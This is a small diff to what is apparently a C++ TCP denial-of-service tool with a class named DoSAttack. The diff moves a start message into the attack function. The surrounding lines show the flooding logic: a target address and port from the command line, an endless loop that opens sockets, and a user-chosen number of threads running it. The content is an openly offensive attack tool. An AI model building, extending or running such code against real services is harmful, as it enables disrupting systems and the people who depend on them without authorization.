@@ -1,7 +1,6 @@
 #include <iostream>
 #include <sys/socket.h>
 #include <arpa/inet.h>
-#include <cstdlib>
 #include <unistd.h>
 #include <vector>
 #include <thread>
@@ -33,6 +32,9 @@ class DoSAttack{
             target_address.sin_port = htons(port);
             inet_pton(AF_INET, ip_address, &target_address.sin_addr);
 
+            cout << "[+] TCP DoS attack started!\n";
+            cout.flush();
+    
 
             while (true){
                 int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -60,9 +62,6 @@ int main(int argc, char* argv[]){
 
     int num_threads = atoi(argv[3]);
 
-    cout << "[+] TCP DoS attack started!\n";
-    cout.flush();
-    
     vector<thread> threads;
     for (int i = 0; i < num_threads; ++i) {
         threads.push_back(thread(&DoSAttack::send_attackTCP, &DosObj, argv[1], atoi(argv[2])));
